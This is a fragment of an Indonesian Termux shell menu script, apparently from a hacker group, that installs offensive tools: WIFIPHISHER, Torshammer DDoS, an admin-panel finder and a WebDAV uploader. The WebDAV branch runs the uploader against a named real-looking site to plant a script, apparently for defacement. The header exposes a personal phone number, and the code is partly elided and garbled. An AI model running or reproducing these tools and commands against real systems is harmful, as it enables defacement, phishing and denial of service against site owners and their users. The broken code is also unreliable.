#LU kira ni tools gua reqode punya orang wkwkwkw
...
echo "       * Author   : MR_XiD                  * " | 
lolcat
echo "       * No Whatsapp : 083851312460            * " | 
lolcat
echo "       * facebook : susu bendera            * " | 
lolcat
echo "       * Thanks To : ALL member D35TR0Y SQUAD* " | 
lolcat
echo "       * SPECIAL TO        * " | 
lolcat
echo "       * MA || CYB3R GHOST || CRUSHER ||MR EXPLOR5 " | 
lolcat
echo "       *||  ALL MEMBER TEAM      * " | 
lolcat
echo "       ***************************************** " | 
lolcat
...
echo "========================================" | lolcat
echo  $cyan  "2. Install Katolin" 
echo "========================================" | lolcat
echo  $blue  "3. Install santet online" 
echo "========================================" | lolcat
echo  $green "4. Install Admin-Finder" 
echo "========================================" | lolcat
...
echo "========================================" | lolcat
echo "$cyan "8.WIFIPHISHER"
echo "========================================" | lolcat
echo "$blue "9.install Hakku
echo "========================================" | lolcat
echo "$green "10.install DDOS TORSHAMMER"
echo "========================================" | lolcat
echo "red "11.info pembuat"
echo "=======================================" | lolcat
echo "blue "12.spesial 500 tool installer"
echo "=======================================" | lolcat
echo  $red  "18+. Keluar" 
echo "========================================" | lolcat
echo $green
read -p " root@MR_XiD:~#" pil;
...
apt install python2
clear
pip2 install urllib3 chardet certiÚ idna requests
clear
...
clear
"/data/data/com.termux/Úles/home/webdav
clear

 cd /sdcard/nama_script.htm ~/webdav
clear
 python2 webdav.py (target.cok) (nama sc depes lu)
clear
python2 webdav.py http://orders.southeasternfood.com/dep
clear
;;
2) clear
toilet -f standard "  MR_XiD  " -F gay
...
echo "              [===============================================]"|lolcat
;;
12)echo "[ini dulu ya gua cape nulis]" | lolcat
;;
99) echo "[D35TROY SQUAD]" | lolcat
echo "ORANG NEWBYE WAJARIN" | lolcat
echo "W Gans Tq ;v" | lolcat
echo 'G' | lolcat
echo 'O' | lolcat
echo 'O' | lolcat
echo 'D' | lolcat
